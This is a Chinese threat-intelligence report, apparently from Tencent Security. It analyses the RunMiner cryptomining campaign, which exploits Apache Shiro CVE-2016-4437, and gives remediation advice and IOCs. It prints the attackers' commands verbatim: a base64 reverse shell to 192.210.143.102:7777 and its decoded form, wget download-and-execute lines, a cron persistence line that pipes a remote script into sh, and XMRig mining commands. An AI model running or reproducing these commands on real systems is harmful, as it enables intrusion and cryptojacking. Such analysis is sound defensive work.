## 一、概述

腾讯主机安全（云镜）捕获RunMiner挖矿木马利用Apache
Shiro反序列化漏洞（CVE-2016-4437）攻击云服务器。RunMiner挖矿团伙入侵成功后会执行命令反弹shell连接到C2服务器对肉鸡系统进行远程控制，然后继续下载执行Run.sh，下载XMRig挖矿木马tcpp进行门罗币挖矿，病毒通过安装定时任务进行持久化。

根据RunMiner挖矿木马使用的门罗币钱包算力(约268.6KH/s)推算，该挖矿团伙已控制约16000台服务器执行挖矿任务。在黑客控制的服务器上还发现多个扫描探测、网络入侵和远程控制工具，该团伙显然是专业黑灰产经营团伙之一。

腾讯安全专家建议企业检查服务器是否部署低于1.2.5版本的Apache
Shiro，并尽快将其升级到1.2.5及以上版本以修复漏洞。同时对以下位置进行检查，以删除挖矿木马安装的相关文件，结束挖矿进程，删除定时任务：

文件：

/tmp/tcpp

/tmp/.fsksdvsler/tcpp

  

定时任务：

/var/spool/cron/`whoami`（whoami为当前用户）

@daily wget -O - -q http[:]//45.14.150.62/task.sh | sh > /dev/null 2>&1

  

进程1：

bash -c
{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMjEwLjE0My4xMDIvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}

  

进程2：

/tmp/tcpp --coin monero -o mine.c3pool.com:13333 -u
42JLDjTVemj7Gxv6krGmQ97HLEqaJC7sA3Ai8wkgL4WJSEjJ4qGmrdLjAs4rLMRrh6Bn7fWz9bD571iLcQmEj46A5CA21e5
-p y -k --donate-level=1 -B --cpu-max-threads-hint=50

/tmp/tcpp --coin monero -o mine.c3pool.com:13333 -u
44aaSGS1BGPiMaHeaytCHK4DDQjMtwoFsTiE5UCh3vNMXkXQ2odu5exHD4UCKA5GsGBZCQ2YV4uMY7nduQHiWBhFD5SND4x
-p y -k --donate-level=1 -B --cpu-max-threads-hint=50

/tmp/tcpp --coin monero -o mine.c3pool.com:13333 -u
46YngqQEZQ6HYhqP7noesGdoecXZRM2jR16t7RKTbhW4TtqdKUQyggs3x7pADEWvpr5ySbesyQQwJfaHbewXurEWNdeWNtj
-p x -k --donate-level=1 -B --cpu-max-threads-hint=70

/tmp/tcpp --coin monero -o xmr.f2pool.com:13531 -u
49TcGmxFmHXCueAHAHF3dPPn6KmFXbxMuZJszFkppnpXKXAceJ8jQ1xGTVMNgnpnwv7SrLZq6Yt5kA937MXUv4nWBN1D1DF.04
-p x -k --donate-level=1 -B --cpu-max-threads-hint=50

进程3：

/tmp/.fsksdvsler/tcpp --coin monero -o mine.c3pool.com:13333 -u
43arbEqHabLE2qZESVFq8G3wDH95putrkUHoYZkPZuH7ARUA6SS46uQaEzBFzVj8HLf2qUV5kz9MDUJmp5haD2fvFroxKiJ
-p y -k --donate-level=1 -B --cpu-max-threads-hint=50

## 二、详细分析

Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。在Apache
Shiro <=1.2.4版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。

攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞CVE-2016-4437，进而在目标机器上执行任意命令。

该漏洞利用POC已被公开：

<https://github.com/lightless233/Java-Unserialization-Study/tree/master/src/main/java/me/lightless/shiro>

  

攻击者批量扫描网站，并将精心构造的包含漏洞利用的数据包发送至目标服务器。

![](https://image.3001.net/images/20201203/1606994974_5fc8cc1e9f90c0a1f4644.png!small)

漏洞攻击成功后执行恶意命令。

![](https://image.3001.net/images/20201203/1606994988_5fc8cc2c29acfb1b4ad4b.png!small)

  

首先执行一段Payload:

bash -c
{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMjEwLjE0My4xMDIvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}

  

base64解密：

bash -i >& /dev/tcp/192.210.143.102/7777 0>&1

  

Payload通过反弹shell连接到C2地址（也就是攻击源IP）：192.210.143.102:7777，之后黑客可通过192.210.143.102对中招机器进行完全控制。

  

然后执行另一段Payload下载run.sh:

wget -q http[:]//45.14.150.62/run.sh -O /tmp/run.sh ; chmod +x /tmp/run.sh ;
sh /tmp/run.sh

  

run.sh下载shell脚本task.sh并云行，同时将其安装为定时任务每天执行一次

/var/spool/cron/`whoami`，其中whoami为当前用户。

![](https://image.3001.net/images/20201203/1606994999_5fc8cc37bbef32c6db156.png!small)

接着task.sh下载门罗币挖矿木马tcpp到tmp目录并启动，挖矿使用矿池：

mine.c3pool.com:13333

  

使用钱包：

42JLDjTVemj7Gxv6krGmQ97HLEqaJC7sA3Ai8wkgL4WJSEjJ4qGmrdLjAs4rLMRrh6Bn7fWz9bD571iLcQmEj46A5CA21e5
![](https://image.3001.net/images/20201203/1606995008_5fc8cc403e90d4dcae1fb.png!small)

  

tcpp采用开源挖矿程序xmrig编译生成。

![](https://image.3001.net/images/20201203/1606995018_5fc8cc4adcd9fe5c37891.png!small)

  

腾讯安全专家在该挖矿团伙的多个入侵行动中发现该团伙使用了5个钱包，根据钱包算力总和268.6KH/s推算，该挖矿团伙已控制约16000台服务器进行挖矿。

![](https://image.3001.net/images/20201203/1606995031_5fc8cc57c0a408a5b3774.png!small)

## 三、其他黑客工具

在溯源的过程中，我们在黑客控制的服务器上发现多个文件，其中包含大量的扫描探测、网络入侵、远程控制、群发消息等黑客工具。

![](https://image.3001.net/images/20201203/1606995041_5fc8cc61994ff2828d1b1.png!small)

疑似失陷IP列表ip.txt，处于实时更新状态，目前已有2000多个IP。

![](https://image.3001.net/images/20201203/1606995051_5fc8cc6b24a9408374b5a.png!small)

  

SQL账号密码爆破入侵和执行shell工具：“SQL TOOLS 2.0功能增强版.exe”。

![](https://image.3001.net/images/20201203/1606995059_5fc8cc73f38015dabe8e9.png!small)

  

内网穿透工具frpc：

![](https://image.3001.net/images/20201203/1606995068_5fc8cc7ceb91e90b87a8b.png!small)

  

短信轰炸源码以及网络入侵工具Netcat：

![](https://image.3001.net/images/20201203/1606995077_5fc8cc85b62a7c545ff50.png!small)

  

网络发包代码post22.java：

![](https://image.3001.net/images/20201203/1606995086_5fc8cc8ecba5aba19295c.png!small)

  

数字加密货币余额查询代码search.class：

![](https://image.3001.net/images/20201203/1606995095_5fc8cc97d5842beb6fca4.png!small)

  

还发现有多个网站源码文件：

![](https://image.3001.net/images/20201203/1606995106_5fc8cca28d906a3339159.png!small)

  

其中一个网站文件与数字加密货币相关平台“币成学院”有关联：

![](https://image.3001.net/images/20201203/1606995116_5fc8ccac7031e7bef13c1.png!small)

## IOCs

 **IP**

27.124.39.121

45.14.150.62

192.210.143.102

  

 **C2**

192.210.143.102:7777

  

 **Md5**

run.sh

52a5f931aa1933d80bb1eb3069450393

  

task.sh

b12919c28eb1025da125c56097574809

  

tcpp

ef2d9270085b7c0cfa3c56aff4a5c928

  

 **URL**

http[:]//27.124.39.121:29324/ex/task.sh

http[:]//27.124.39.121:29324/ex/run.sh

http[:]//27.124.39.121:29324/ex/tcpp

http[:]//45.14.150.62/run.sh

http[:]//45.14.150.62/task.sh

http[:]//45.14.150.62/tcpp

  

 **钱包：**

42JLDjTVemj7Gxv6krGmQ97HLEqaJC7sA3Ai8wkgL4WJSEjJ4qGmrdLjAs4rLMRrh6Bn7fWz9bD571iLcQmEj46A5CA21e5

44aaSGS1BGPiMaHeaytCHK4DDQjMtwoFsTiE5UCh3vNMXkXQ2odu5exHD4UCKA5GsGBZCQ2YV4uMY7nduQHiWBhFD5SND4x

46YngqQEZQ6HYhqP7noesGdoecXZRM2jR16t7RKTbhW4TtqdKUQyggs3x7pADEWvpr5ySbesyQQwJfaHbewXurEWNdeWNtj

49TcGmxFmHXCueAHAHF3dPPn6KmFXbxMuZJszFkppnpXKXAceJ8jQ1xGTVMNgnpnwv7SrLZq6Yt5kA937MXUv4nWBN1D1DF

43arbEqHabLE2qZESVFq8G3wDH95putrkUHoYZkPZuH7ARUA6SS46uQaEzBFzVj8HLf2qUV5kz9MDUJmp5haD2fvFroxKiJ

